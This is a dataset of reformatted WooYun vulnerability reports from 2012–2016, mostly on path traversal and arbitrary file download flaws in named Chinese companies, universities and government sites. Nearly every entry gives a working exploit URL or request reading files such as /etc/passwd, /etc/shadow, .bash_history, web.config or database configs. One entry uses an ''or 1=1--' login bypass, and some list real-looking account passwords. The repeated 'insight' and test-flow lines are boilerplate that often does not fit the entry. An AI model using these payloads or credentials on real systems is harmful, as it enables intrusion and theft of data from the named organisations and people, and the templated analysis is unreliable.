### [wooyun-2012-010485] 电信某站点存在任意文件读取暴露数据库信息
**厂商**: 电信 | **年份**: 2012 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 电信我爱动漫采用PHPcmsV9做二次开发，存在任意文件读取漏洞。

**POC**: http://dm.189.cn/index.php?m=search&c=index&a=public_get_suggest_keyword&url=asdf&q=../../caches/configs/database.php图为暴露出来的信息

**绕过**: 直接利用

**修复**: phpcmsV9任意文件读取漏洞，升级官方最新版本即可，或者对search模块单独做补丁
---

---
### [wooyun-2014-049856] 大汉版通身份认证JIS系统任意文件下载漏洞
**厂商**: 南京大汉网络有限公司 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 认证接口

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 界面：jis任意文件下载。至少WIN下一般都可以通杀，个别版本加了权限验证需要登录，但是我觉得只要登录后的身份合适，在win下都通杀的。

**POC**: if(strFilePath.indexOf("WEB-INF")!=-1){LogWriter.debug("下载文件不存在!");out.println("<script>alert('file not exist!');history.back();</script>");return;}//判断文件是否存在File file = new File(strFilePath);if (!file.exists() || file.getName().endsWith(".jsp")) {LogWriter.debug("下载文件不存在!");out.println("<script>ale

**绕过**: 直接利用

**修复**: 厂商懂的
---

---
### [wooyun-2015-0140894] 孔子学院敏感信息泄漏涉及多套系统
**厂商**: 孔子学院 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 地址：**.**.**.**/包含多个系统，罗列几个：孔子学院日：**.**.**.**/cio_day2015/对应系统的数据库文件：**.**.**.**/cio_day2015_0828.sql过滤系统：**.**.**.**/guolv/对应源码：**.**.**.**/guolv_20150810.tar.gz监控系统：**.**.**.**/jiankong/对应源码：**.**.**.**/jiankong_20150812.tar.gz摄影系统：**.**.**.**/sheying2015/对应源码：**.**.**.**/sheying2015.tar.gz投稿系统：**.**.**.**/tougao/对应源码：**.**.**.**/tougao.tar.gz

**POC**: 从某个源码中拿到数据库root密码：**.**.**.**/guolv_20150810.tar.gz \guolv\sites\default\settings.php网站包含一个phpmyadmin系统：**.**.**.**/ciodpma/ 成功登录：涉及系统很多，比较敏感，没有进一步测试。

**绕过**: 直接利用

**修复**: 关闭目录遍历，增强口令。
---

---
### [wooyun-2015-0134508] 域名商安全之时代互联某站get任意文件读取
**厂商**: 广东时代互联科技有限公司 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: GET //downloadPDF.php?filename=../../../../../../../../../../etc/passwd HTTP/1.1Host: icp.now.cnAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.107 Safari/537.36Accept-Encoding: gzip, deflate, sdchAccept-Language: zh-CN,zh;q=0.8Cooki

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-057606] 江苏师范大学备份文件下载
**厂商**: 江苏师范大学 | **年份**: 2014 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 后台管理

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 江苏师范大学备份文件下载  不知道怎么回事 随便一检测 就发现了这个备份  后台账号密码皆有    这种低级错误也能犯  600多M的备份 都不知道什么东西 能这么多！！！

**POC**: 江苏师范大学备份文件下载  http://www.jxnu.edu.cn/jxnu.zip

**绕过**: 直接利用

**修复**: 这么简单我就不用说了
---

---
### [wooyun-2013-020192] 茂业国际供应商服务平台任意文件下载
**厂商**: 茂业百货 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 任意文件下载http://ssp.maoye.cn/servlet/DownloadFileOper?fileName=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswdroot:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sb

**POC**: root:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:12:mai

**绕过**: 直接利用

**修复**: 同我上一个案例
---

---
### [wooyun-2014-066732] ZTE-F420路由器设备配置文件未授权下载
**厂商**: 中兴通讯股份有限公司 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 日志文件 http://地址/manager_log_conf_t.gch点击“下载日志”即可下载日志设备配置文件下载 http://地址/manager_dev_config_t.gch用户配置文件下载 http://地址/manager_dev_defcfg_t.gch案例： http://58.255.211.141/manager_dev_defcfg_t.gch

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 添加权限
---

---
### [wooyun-2014-065829] 上海快捷快递某系统任意文件下载漏洞泄露oracle账号
**厂商**: 上海快捷快递 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 认证接口

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://oa.kjkd.com/使用万能密码可直接登录，登录后发现资源下载页面下载链接没有验证，下载到的web.config发现oracle账号，可以登录。

**POC**: 使用万能密码'or 1=1--登录http://oa.kjkd.com/删掉前置的div层发现一个资源下载页面随便试一个文件，把参数改成../web.config试试成功了，发现有oracle账号再试一个试试oracle能不能登录

**绕过**: 直接利用

**修复**: 你懂的
---

---
### [wooyun-2014-068956] Zoomla CMS 存在任意文件读取漏洞
**厂商**: 逐浪CMS | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 参数注入, 后台管理

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 官网演示demohttp://demo.zoomla.cn后台地址http://demo.zoomla.cn/admin/login.aspx演示账户:admin 密码：admin888测试地址：http://demo.zoomla.cn/Admin/I/Template/TemplateEdit.aspx?setTemplate=%2fTemplate%2fV3&filepath=../../../config/AppSettings.config其中修改installed参数为false以后 可以执行重装改好以后 访问http://demo.zoomla.cn/install即可重装（测试成功）访问 http://demo.zoomla.cn/Admin/I/Template/TemplateManage.aspx?setTemplate=%2f&Dir=可以遍历，可以删除指定，修改任

**POC**: http://demo.zoomla.cn/robots.txt看最低行

**绕过**: 直接利用

**修复**: 对路径进行限制
---

---
### [wooyun-2015-0120298] 华硕的亚马逊云服务器中配置不当导致目录遍历(可访问设某产品系统信息及管理后台)
**厂商**: 华硕 | **年份**: 2015 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 后台管理

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 华硕的亚马逊云服务器中配置不当导致目录遍历，可访问疑似某产品研发或测试环境及产品后台无聊之中在开发一个web检测工具时，偶然间觉得localhost测试很无趣，于是灵感一闪出现华硕，然后一个华硕的亚马逊云服务出现了，惊奇的发现存在目录遍历。然后。。。

**POC**: 先是发现一个http://ec2-54-202-251-7.us-west-2.compute.amazonaws.com/find/device.htmlimg src="https://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/201506/132016185d2ec53ff2c853d61c9be24732213c84.png" alt="QQ图片20150613201609.png" />页面中的链接貌似点不开接着http://ec2-54-202-251-7.us-west-2.compute.amazonaws.com/find<遍

**绕过**: 直接利用

**修复**: 你懂的
---

---
### [wooyun-2015-095097] Mao10CMS任意文件读取+注入--需条件
**厂商**: mao10.com | **年份**: 2015 | **类型**: SQL注射漏洞

**元思考**: 触发信号: 功能测试

**洞察**: SQL注射漏洞防护不足，开发者信任前端输入

**测试流程**:
1. 识别SQL注射漏洞相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: 在安装完默认情况下weixin_token是空的，此时也可以利用微信接口文件漏洞Application/Control/Controller/WeixinController.class.phppublic function callback_url(){$signature = $_GET["signature"];$timestamp = $_GET["timestamp"];$nonce = $_GET["nonce"];$echostr = $_GET["echostr"];$token = mc_option('weixin_token');//null$tmpArr = array

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2012-013726] j2ee分层架构安全（注册乌云1周年庆祝集锦） -- 携程
**厂商**: 携程旅行网 | **年份**: 2012 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 首先看一个以前典型的case:WooYun: 去哪儿任意文件读取（基本可重构该系统原工程）或哥这篇粗糙的文章：http://hi.baidu.com/shine%5F%C9%C1%C1%E9/blog/item/7d7d57445f523a4384352468.html

**POC**: http://map.ctrip.com/WEB-INF/web.xml

**绕过**: 直接利用

**修复**: 如上！
---

---
### [wooyun-2014-087736] 杭州电子科技大学数字杭电系统存在文件及目录遍历漏洞导致敏感信息泄漏
**厂商**: 杭州电子科技大学 | **年份**: 2014 | **类型**: 重要敏感信息泄露

**元思考**: 触发信号: 认证接口

**洞察**: 重要敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别重要敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某次闲着没事 在登录数字杭电网站的时候 抓了个包 然后发现了数字杭电的文件及目录可以遍历数字杭电地址 http://i.hdu.edu.cn/   这里需要学生登录  我的帐号14081520  密码cs1996414成功登陆后浏览器直接访问   以下等多个目录http://i.hdu.edu.cn/dcp/dcp/   这个目录进去 好像网页都可以直接下载http://i.hdu.edu.cn/dcp/upload_files/http://i.hdu.edu.cn/dcp/upload_files/storage/  这个目录下能下载到很多文件包括部分学生个人信息以及一些pdf xls doc等涉及到多类的文档文件这些目录下的等能遍历   很多敏感文件可以下载

**POC**: 某次闲着没事 在登录数字杭电网站的时候 抓了个包 然后发现了数字杭电的文件及目录可以遍历数字杭电地址 http://i.hdu.edu.cn/   这里需要学生登录  我的帐号14081520  密码cs1996414成功登陆后浏览器直接访问   http://i.hdu.edu.cn/dcp/dcp/ 等目录  可以发现遍历很多敏感文件可以下载这个是.svn找出了编辑器地址似乎是上传点 没测试过正则下 写个脚本跑下目录下载文件可以下载很多文件其中能看到某位校友的资料也有很多pdf的电子书等等http://i.hdu.edu.cn/dcp/upload_files/storage/  这个目录

**绕过**: 直接利用

**修复**: 修复遍历目录漏洞
---

---
### [wooyun-2013-025198] TCL某分站遍历目录、源码泄漏
**厂商**: TCL | **年份**: 2013 | **类型**: 重要敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 重要敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别重要敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 两站分别存在任意目录遍历，phpinfo敏感信息泄漏。。。。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 文件访问权限改下吧。。。。。
---

---
### [wooyun-2014-048909] 雨林木风某分站存在任意文件下载漏洞
**厂商**: 广东雨林木风计算机科技有限公司 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 站点：http://tool.114la.comhttp://tool.114la.com/?ac=wapview_api&ct=site&Data=&Method=get&URL=../../../../../../../../../../etc/hostshttp://tool.114la.com/?ac=wapview_api&ct=site&Data=&Method=get&URL=../../../../../../../../../../etc/grouphttp://tool.114la.com/?ac=wapview_api&ct=site&Data=&Method=get&URL=../../../../../../../../../../etc/resolv.confhttp://tool.114la.com/?ac=wapview_api&ct=site&Data=&

**POC**: 内网ipover

**绕过**: 直接利用

**修复**: 限制目录访问
---

---
### [wooyun-2013-033104] 易通贷PHP程序任意文件读取漏洞
**厂商**: 易通贷 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.etongdai.com/index.php?plugins&q=imgurl&url=QGltZ3VybEAvY29yZS9jb21tb24uaW5jLnBocA==用IE打开，遨游用户请选用兼容模式

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 做好过滤。
---

---
### [wooyun-2015-0116424] 明道运维不当导致通过系统api查看企业内部信息
**厂商**: 上海万企明道软件有限公司 | **年份**: 2015 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1、神器发现明道log.mingdao.com分站存在目录遍历漏洞2、通过日志查看企业私有信息Index of /api/2015-05-26/../10-6-1-41_api.log                                  27-May-2015 01:30       010-6-2-60_api.log                                  27-May-2015 01:30       010-6-5-130_api.log                                 27-May-2015 01:30       010-6-8-109_api.log                                 27-May-2015 01:30    143K日志中包含带有access_token的u

**POC**: 1、Index of /api/2015-05-26/../10-6-1-41_api.log                                  27-May-2015 01:30       010-6-2-60_api.log                                  27-May-2015 01:30       010-6-5-130_api.log                                 27-May-2015 01:30       010-6-8-109_api.log                        

**绕过**: 直接利用

**修复**: 1、禁止目录遍历。
---

---
### [wooyun-2015-0139204] 北京城建某系统弱口令导致内部信息泄露(含北京地铁部分线路信息)
**厂商**: 北京城建 | **年份**: 2015 | **类型**: 后台弱口令

**元思考**: 触发信号: 认证接口

**洞察**: 后台弱口令防护不足，开发者信任前端输入

**测试流程**:
1. 识别后台弱口令相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: #1 北京地铁设计信息管理平台网址：http://www.bsdimp.net/经过爆破，可以得到五个账号登陆之后跳转到网页http://203.187.185.142/cjcs/ztzb.do?actionType=changelabel&labelId=16&webId=18可以查看一些内部信息另外发现这个系统存在目录遍历的漏洞http://203.187.185.142/cjcs/message/http://203.187.185.142/cjcs/webEdit/http://203.187.185.142/cjcs/information/等#2 北京城建设计系统办公系统http://o.bjucd.com/wui/theme/ecology7/page/login.jsp?templateId=21&logintype=1&gopage=&message=16经过爆破得到两个

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 修改密码，让队友变得不在笨，不再懒
---

---
### [wooyun-2016-0168270] 创维某系统漏洞打包（文件读取&弱口令）
**厂商**: 深圳市酷开网络科技有限公司 | **年份**: 2016 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 地址：http://14.17.69.188/admin1#文件包含http://14.17.69.188/skyservice/pic?/etc/hostshttp://14.17.69.188/skyservice/pic?/etc/shadowhttp://14.17.69.188/skyservice/pic?/root/.bash_history你懂的http://14.17.69.188/skyservice/pic?/usr/local/jboss/server/default/deploy/mysql-ds.xml

**POC**: 2#弱口令http://14.17.69.188/adminadmin/admin

**绕过**: 直接利用

**修复**: 过滤&强口令
---

---
### [wooyun-2015-0123528] 易龙天网旗下CMS任意文件读取漏洞
**厂商**: 北京易龙天网科技有限公司 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 可以看到，程序读取任意文件，然后输出了，if(is_array($areablockVars))$tmp=htmlspecialchars_decode($areablockVars['content_html']);else$tmp=(file_get_contents($_GET['tpl']));

**POC**: 来几个案例吧中化石油：http://www.sinochemoil.com/esbclient/loadarea.php?tpl=c:\windows\system32\drivers\etc\hosts鹏龙股份：http://www.bjrocar.com/esbclient/loadarea.php?tpl=/etc/passwd必可测科技：http://www.bicotest.com.cn/esbclient/loadarea.php?tpl=/etc/passwd云泽山庄：http://www.bjyunze.com/esbclient/loadarea.php?tpl=c:\win

**绕过**: 直接利用

**修复**: 过滤
---

---
### [wooyun-2014-059153] 某政府网站任意文件下载遍历（敏感信息泄漏）
**厂商**: 中国动物疫病预防控制中心 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.cadc.gov.cnhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/Files/GreenMail/2021/

**POC**: 还有一些就不截图了.没有下载这些无聊的东西.

**绕过**: 直接利用

**修复**: 分配用户权限.
---

---
### [wooyun-2015-0115956] 中国铁建某系统任意文件读取漏洞
**厂商**: crcc.cn | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: GET /eassso//../../../../../../../../etc/passwd HTTP/1.1Host: hr.crcc.cnUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateCookie: JSESSIONID=wKhkZBrqVWHYFWhJh_DG10GAkfEIV44WcGwA; user_ticket=NONE; eac_ticket=NONE;

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 身份鉴别做好文件过滤
---

---
### [wooyun-2013-026077] 澳门身份证明局 任意文件下载 造成敏感信息泄露
**厂商**: 澳门身份证明局 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 澳门身份证明局 任意文件下载 造成敏感信息泄露

**POC**: 漏洞地址:http://www.dsi.gov.mo/srvDownloadFile.do?file_name=../../../../../../../../../../etc/passwd

**绕过**: 直接利用

**修复**: 你懂得.
---

---
### [wooyun-2015-095257] 某省安全生产信息网内容信息泄露
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 重要敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 重要敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别重要敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.hlsafety.gov.cn/黑龙江省安全生产信息网存在目录遍历、物理路径泄漏等漏洞

**POC**: http://www.hlsafety.gov.cn/apphttp://www.hlsafety.gov.cn/app/zcswz/123.jsphttp://www.hlsafety.gov.cn/app/zcswz/FCKeditor/editor/filemanager/connectors/test.html

**绕过**: 直接利用

**修复**: 运维都懂
---

---
### [wooyun-2014-061225] TRS系统任意文件下载漏洞
**厂商**: 北京拓尔思信息技术股份有限公司 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 上传功能

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 此系统多为大型政府新闻发布站点（新闻源），如一旦被某些（博彩集团）控制，估计后果危害不是一般大。。。http://123.131.133.150:8080/wcm/ 临沂日报报业集团http://61.153.63.94/wcm 云和县政府所有发布站点http://www.cflac.org.cn/wcm 中国文联http://wcm.xxz.gov.cn:8080/wcm/ 湘西州政府站群http://www.jscnt.gov.cn/wcm/ 江苏省文化厅http://www.sccnt.gov.cn 四川省文化厅http://218.94.123.203/wcm 江苏长安网http://203.86.89.25/wcm/ 中国书籍出版社http://www.lfcgs.gov.cn:8080/wcm/ 廊坊车管所http://iwr.cass.cn/wcm/ 中国社会科学院http:

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-077210] 某用户量特别大的教育类CMS存在任意文件下载
**厂商**: Cncert国家互联网应急中心 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞页面：http://www.hbycscjzx.com//OperationManage/DownFile.aspx首先注册一个普通账户在个人中心写站内消息的时候插入附件抓包。可以看到以下内容POST /OperationManage/DownFile.aspx HTTP/1.1Host: www.hbycscjzx.comProxy-Connection: Keep-AliveContent-Length: 114Pragma: no-cacheCache-Control: no-cacheAccept: */*Accept-Language: zh-CNContent-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64;

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-053908] 某杂志系统任意文件下载漏洞
**厂商**: 北京玛格泰克科技发展有限公司 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 北京玛格泰克科技发展有限公司 公司开发的Journal 系统存在任意文件下载漏洞，可下载系统重要信息系统介绍http://www.magtech.com.cn/CN/column/column33.shtml官方测试成功http://www.magtech.com.cn/CN/item/downloadFile.jsp?filedisplay=../../CN/item/downloadFile.jsp对传入的filedisplay 变量未过滤导致，任意文件读取 代码如下:<%@page language="java" contentType="application/x-msdownload"import="java.io.*,java.net.*,com.wkxt.article.*,com.wkxt.article.web.*,com.lyt.*,com.lyt.web.*,java

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 对参数进行过滤
---

---
### [wooyun-2015-0150538] 航空安全之春秋航空任意文件下载/爆破(导致泄露内部资料)
**厂商**: 春秋航空 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞点：http://fcs.9cair.comhttp://fcs.9cair.com/ImageShowServlet?para=fcs123&filetype=1&filePath=../../../../../../../../../etc/passwd%00爆破，虽然让人提过,修复了OA的爆破漏洞；但是mail的没修复,有些账号密码还是未修改建议强制修改吧!漏洞点：mail.ch.cn 弱密码:123456xupingxuyizhaotiewuhaojiangkua

**POC**: 已证明

**绕过**: 直接利用

**修复**: 过滤..；强制修改密码，QQ的mail邮箱好像可以设置登陆微信提醒！
---

---
### [wooyun-2015-0164818] 山东大学某分站任意文件下载导致敏感信息泄漏
**厂商**: 山东大学 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: URL:http://www.medgrade.sdu.edu.cn/downloadfile.php?path=下载index.php发现文件不存在，于是猜了一下config.php结果真的存在：下载config.php:URL:http://www.medgrade.sdu.edu.cn/downloadfile.php?path=config.php里面直接包含数据库的帐号密码：

**POC**: (见原文)

**绕过**: 直接利用

**修复**: YOU KNOW
---

---
### [wooyun-2016-0190361] 中赢金融任意文件下载漏洞
**厂商**: 中赢金融 | **年份**: 2016 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.chinazyjr.com/index.php?m=index&c=contactus&a=fileDown&pdfname=../../../etc/passwdhttp://www.chinazyjr.com/index.php?m=index&c=contactus&a=fileDown&pdfname=/application/config/database.php

**POC**: javascript:void(0)>

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0120541] 渗透测试阿姨帮(大量雇主阿姨数据泄漏)
**厂商**: ayibang.com | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 任意文件读取：http://ayibang.com/appointment/detail?city=%E5%8C%97%E4%BA%AC&keyword=../../../../../../../../../../etc/passwd%00.jpg

**POC**: 当前用户www，可读取.bash_history/appointment/detail?city=%E5%8C%97%E4%BA%AC&keyword=../../../../../../../../../../home/www/.bash_history%00.jpg/data/webserver/nginx/conf/vhost/admin.ay.com.confroot  /data/htdocs/admin.ay.com/publiclisten	 8306;server_name  admin.ay.com admin0803.ayibang.com;修改hosts，访问后台，这后台

**绕过**: 直接利用

**修复**: 过滤，限定不可跨父目录增强安全
---

---
### [wooyun-2015-0132070] 乐知行教学系统高危任意文件包含
**厂商**: 乐知行 | **年份**: 2015 | **类型**: 文件包含

**元思考**: 触发信号: 功能测试

**洞察**: 文件包含防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件包含相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 厂商：北京乐知行软件有限公司是一家教育信息化软件公司，业务涉及教育信息化整体解决方案、互联网教育、教育公有云，是北京市及国家高新技术企业，公司致力于全新的应用技术与用户体验，运用云计算、大数据、移动联网技术，为中国教育信息化的推进与优化搭建全新的操作与创新平台。这个漏洞用浏览器还真得不到结果的。任意文件读取：/datacenter/global/login.do?bg=../../../../../../../etc/passwd%00Case:**.**.**.**/datacenter/global/login.do?bg=../../../../../../../etc/passwd%00http://**.**.**.**/datacenter/global/login.do?bg=../../../../../../../etc/passwd%00http://**.**.**.

**POC**: Security Testing:1、我们看浏览器测试的结果；没有返回结果啊~难道浏览器问题，换个google抓包看一下。还是没有，这时候我就突然想到了可以使用curl来试试对吧。结果！哈哈！果然成功了！2、试试读取shadow看看，居然读出来了，危害度过高啊！

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-084756] 湖南省政府子站点任意文件下载
**厂商**: 湖南省政府 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 参数注入

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 站点地址：http://smb.hunan.gov.cn/网站下载功能处对输入的参数未能进行完整的过滤，导致可以下载任意文件。如下图，下载网站的web.config，来获取数据库帐号密码

**POC**: 不做过多举例

**绕过**: 直接利用

**修复**: 过滤参数。加强运营运维管理，小漏洞也能攻破防线，act.hunan.gov.cn 这台服务器已经被有webshell存在。
---

---
### [wooyun-2012-016569] 上海电信网上营业厅任意文件下载漏洞
**厂商**: 中国电信 | **年份**: 2012 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 参数注入

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 参数没限制，可以下载任意文件。参数直接用绝对路径，也是有问题的。1、查看自己家里帐单的时候，右键图片URL地址不小心发现的。。2、下载配置文件web.xml3、找到个数据库配置文件4、下载其他jsp源文件仅做以上安全检测。

